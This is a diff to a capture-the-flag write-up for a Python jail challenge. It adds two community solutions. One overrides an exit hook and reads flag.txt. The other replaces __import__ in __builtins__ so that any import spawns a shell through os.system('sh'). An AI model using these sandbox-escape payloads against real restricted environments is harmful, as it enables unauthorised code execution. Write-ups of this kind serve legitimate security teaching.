@@ -43,4 +43,12 @@ p.interactive()
 
 Flag: `jail{i_am_proto_your_security_is_my_motto_install_me_on_your_computer_to_protect_your_data_better_f6b37a6e6d0b0af2b5da77a61cd0af7c}`.
 
-An elegant and simple solution is provided by @mirelgigel at [mirelgigel/writeupjailctf](https://github.com/mirelgigel/writeupjailctf).
+An elegant and simple solution is provided by @mirelgigel at [mirelgigel/writeupjailctf](https://github.com/mirelgigel/writeupjailctf): `import sys; sys.modules['__main__'].__dict__['_exit']=int; print(open('flag.txt').read())`.
+
+@maple3142 on Discord provides another solution:
+
+```python
+import os
+__builtins__["__import__"] = lambda *a, os=os: os.system("sh")
+import x
+```
